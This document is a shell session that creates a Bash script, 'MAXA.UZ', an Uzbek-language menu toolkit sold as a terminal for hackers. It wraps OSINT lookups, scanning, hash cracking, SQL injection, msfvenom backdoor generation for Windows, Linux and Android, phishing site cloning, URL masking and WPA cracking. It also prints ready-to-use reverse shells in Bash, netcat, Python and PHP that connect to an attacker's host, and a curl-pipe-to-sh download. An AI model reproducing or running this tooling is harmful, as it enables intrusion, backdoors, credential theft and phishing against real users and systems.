cd ~/MAXA.UZ

cat > maxa.sh << 'EOF'
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

clear

echo -e "${RED}"
cat << "B"
    ███╗   ███╗ █████╗ ██╗  ██╗ █████╗   ██╗   ██╗███████╗
    ████╗ ████║██╔══██╗╚██╗██╔╝██╔══██╗  ██║   ██║╚══███╔╝
    ██╔████╔██║███████║ ╚███╔╝ ███████║  ██║   ██║  ███╔╝ 
    ██║╚██╔╝██║██╔══██║ ██╔██╗ ██╔══██║  ██║   ██║ ███╔╝  
    ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗██║  ██║  ╚██████╔╝███████╗
    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═════╝ ╚══════╝
B
echo -e "${YELLOW}          HAQIQIY HAKERLAR UCHUN TERMINAL${NC}"
echo -e "${YELLOW}                 MAXA.UZ v1.0${NC}"
echo ""

while true; do
    echo -e "${CYAN}========================================${NC}"
    echo -e "${GREEN}[1]${NC} QIDIRUV (OSINT)"
    echo -e "${GREEN}[2]${NC} TARMOV (NETWORK)"
    echo -e "${GREEN}[3]${NC} PAROL (CRACKING)"
    echo -e "${GREEN}[4]${NC} WEB HUJUM (WEB ATTACK)"
    echo -e "${GREEN}[5]${NC} ZARARLI DASTUR (MALWARE)"
    echo -e "${GREEN}[6]${NC} FIRIBGARLIK (PHISHING)"
    echo -e "${GREEN}[7]${NC} SIMSIZ (WIRELESS)"
    echo -e "${GREEN}[8]${NC} FOYDALANISH (EXPLOITATION)"
    echo -e "${GREEN}[9]${NC} ORQAGA KIRISH (BACKDOOR)"
    echo -e "${GREEN}[0]${NC} CHIQISH"
    echo -e "${CYAN}========================================${NC}"
    
    read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" choice
    
    case $choice in
        1)
            echo ""
            echo -e "${YELLOW}--- QIDIRUV MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Username Qidirish"
            echo -e "${GREEN}[2]${NC} Ism Familya Qidirish"
            echo -e "${GREEN}[3]${NC} Email Qidirish"
            echo -e "${GREEN}[4]${NC} Telefon Qidirish"
            echo -e "${GREEN}[5]${NC} Domen Qidirish"
            echo -e "${GREEN}[6]${NC} Hammasini Birga"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) read -p "Username: " u; python3 modules/osint.py username "$u" ;;
                2) read -p "Ism Familya: " n; python3 modules/osint.py name "$n" ;;
                3) read -p "Email: " e; python3 modules/osint.py email "$e" ;;
                4) read -p "Telefon: " p; python3 modules/osint.py phone "$p" ;;
                5) read -p "Domen: " d; python3 modules/osint.py domain "$d" ;;
                6) read -p "Username: " a; python3 modules/osint.py all "$a" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        2)
            echo ""
            read -p "$(echo -e ${BLUE}'Target IP: '${NC})" t
            echo -e "${YELLOW}--- TARMOV MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Port Skan"
            echo -e "${GREEN}[2]${NC} Zaiflik Skan"
            echo -e "${GREEN}[3]${NC} DNS Enum"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) python3 modules/network.py port "$t" ;;
                2) python3 modules/network.py vuln "$t" ;;
                3) python3 modules/network.py dns "$t" ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        3)
            echo ""
            read -p "$(echo -e ${BLUE}'Hash: '${NC})" h
            python3 modules/cracker.py crack "$h"
            ;;
        
        4)
            echo ""
            echo -e "${YELLOW}--- WEB HUJUM MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} SQL Injection"
            echo -e "${GREEN}[2]${NC} XSS Hujum"
            echo -e "${GREEN}[3]${NC} Directory Fuzzing"
            echo -e "${GREEN}[4]${NC} CMS Skaner"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) read -p "Target URL: " url
                   echo -e "${CYAN}sqlmap -u \"$url\" --dbs${NC}"
                   sqlmap -u "$url" --dbs 2>/dev/null || echo -e "${RED}sqlmap topilmadi. O'rnatish: apt install sqlmap${NC}" ;;
                2) read -p "Target URL: " url
                   echo -e "${CYAN}xsstrike -u \"$url\"${NC}"
                   echo -e "${RED}XSSStrike alohida o'rnatiladi${NC}" ;;
                3) read -p "Target URL: " url
                   echo -e "${CYAN}dirsearch -u \"$url\"${NC}"
                   dirsearch -u "$url" 2>/dev/null || echo -e "${RED}dirsearch topilmadi${NC}" ;;
                4) read -p "Target URL: " url
                   echo -e "${CYAN}wpscan --url \"$url\"${NC}"
                   wpscan --url "$url" 2>/dev/null || echo -e "${RED}wpscan topilmadi${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        5)
            echo ""
            echo -e "${YELLOW}--- ZARARLI DASTUR MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Windows Payload"
            echo -e "${GREEN}[2]${NC} Linux Payload"
            echo -e "${GREEN}[3]${NC} Android Payload"
            echo -e "${GREEN}[4]${NC} Python Reverse Shell"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) read -p "LHOST: " lh; read -p "LPORT: " lp
                   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f exe -o backdoor.exe 2>/dev/null && echo -e "${GREEN}[+] backdoor.exe yaratildi!${NC}" || echo -e "${RED}msfvenom topilmadi. apt install metasploit-framework${NC}" ;;
                2) read -p "LHOST: " lh; read -p "LPORT: " lp
                   msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -f elf -o backdoor.elf 2>/dev/null && echo -e "${GREEN}[+] backdoor.elf yaratildi!${NC}" || echo -e "${RED}msfvenom topilmadi${NC}" ;;
                3) read -p "LHOST: " lh; read -p "LPORT: " lp
                   msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R -o backdoor.apk 2>/dev/null && echo -e "${GREEN}[+] backdoor.apk yaratildi!${NC}" || echo -e "${RED}msfvenom topilmadi${NC}" ;;
                4) read -p "LHOST: " lh; read -p "LPORT: " lp
                   echo -e "${CYAN}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        6)
            echo ""
            echo -e "${YELLOW}--- FIRIBGARLIK MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Sayt Klonlash (SET)"
            echo -e "${GREEN}[2]${NC} Phishing Sahifa (ZPhisher)"
            echo -e "${GREEN}[3]${NC} Link Yashirish"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) echo -e "${CYAN}setoolkit${NC}"
                   setoolkit 2>/dev/null || echo -e "${RED}setoolkit topilmadi. apt install set${NC}" ;;
                2) echo -e "${CYAN}git clone https://github.com/htr-tech/zphisher${NC}"
                   echo -e "${YELLOW}cd zphisher && bash zphisher.sh${NC}" ;;
                3) read -p "Haqiqiy URL: " real; read -p "Soxa URL: " fake
                   echo -e "${CYAN}Masklangan: ${fake}@${real}${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        7)
            echo ""
            echo -e "${YELLOW}--- SIMSIZ MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} WiFi Monitor"
            echo -e "${GREEN}[2]${NC} Handshake Olish"
            echo -e "${GREEN}[3]${NC} WPA Sindirish"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) echo -e "${CYAN}airmon-ng start wlan0 && airodump-ng wlan0mon${NC}"
                   airmon-ng start wlan0 2>/dev/null && airodump-ng wlan0mon 2>/dev/null || echo -e "${RED}aircrack-ng topilmadi. apt install aircrack-ng${NC}" ;;
                2) read -p "BSSID MAC: " mac; read -p "Kanal: " ch
                   echo -e "${CYAN}airodump-ng -c $ch --bssid $mac -w capture wlan0mon${NC}" ;;
                3) read -p "Wordlist: " wl
                   echo -e "${CYAN}aircrack-ng -w $wl -b MAC capture.cap${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        8)
            echo ""
            echo -e "${YELLOW}--- FOYDALANISH MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Metasploit"
            echo -e "${GREEN}[2]${NC} ExploitDB Qidirish"
            echo -e "${GREEN}[3]${NC} Privilege Escalation"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) msfconsole -q 2>/dev/null || echo -e "${RED}Metasploit topilmadi. apt install metasploit-framework${NC}" ;;
                2) read -p "Dastur nomi: " s
                   searchsploit "$s" 2>/dev/null || echo -e "${RED}searchsploit topilmadi${NC}" ;;
                3) echo -e "${CYAN}LinPEAS: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh${NC}"
                   echo -e "${CYAN}WinPEAS: https://github.com/carlospolop/PEASS-ng/releases${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        9)
            echo ""
            echo -e "${YELLOW}--- ORQAGA KIRISH MENU ---${NC}"
            echo -e "${GREEN}[1]${NC} Bash Reverse Shell"
            echo -e "${GREEN}[2]${NC} Netcat Reverse Shell"
            echo -e "${GREEN}[3]${NC} Python Reverse Shell"
            echo -e "${GREEN}[4]${NC} PHP Reverse Shell"
            echo -e "${GREEN}[0]${NC} Orqaga"
            read -p "$(echo -e ${BLUE}'Tanlang: '${NC})" sub
            case $sub in
                1) read -p "IP: " ip; read -p "Port: " port
                   echo -e "${GREEN}bash -i >& /dev/tcp/$ip/$port 0>&1${NC}" ;;
                2) read -p "IP: " ip; read -p "Port: " port
                   echo -e "${GREEN}nc -e /bin/bash $ip $port${NC}" ;;
                3) read -p "IP: " ip; read -p "Port: " port
                   echo -e "${GREEN}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'${NC}" ;;
                4) read -p "IP: " ip; read -p "Port: " port
                   echo -e "${GREEN}php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NC}" ;;
                0) ;;
                *) echo -e "${RED}Notog'ri tanlov!${NC}" ;;
            esac
            ;;
        
        0)
            echo -e "${RED}[!] MAXA.UZ dan chiqildi!${NC}"
            exit 0
            ;;
        
        *)
            echo -e "${RED}[!] Noto'g'ri raqam! Iltimos 0-9 orasida tanlang.${NC}"
            ;;
    esac
    echo ""
done
EOF

chmod +x maxa.sh
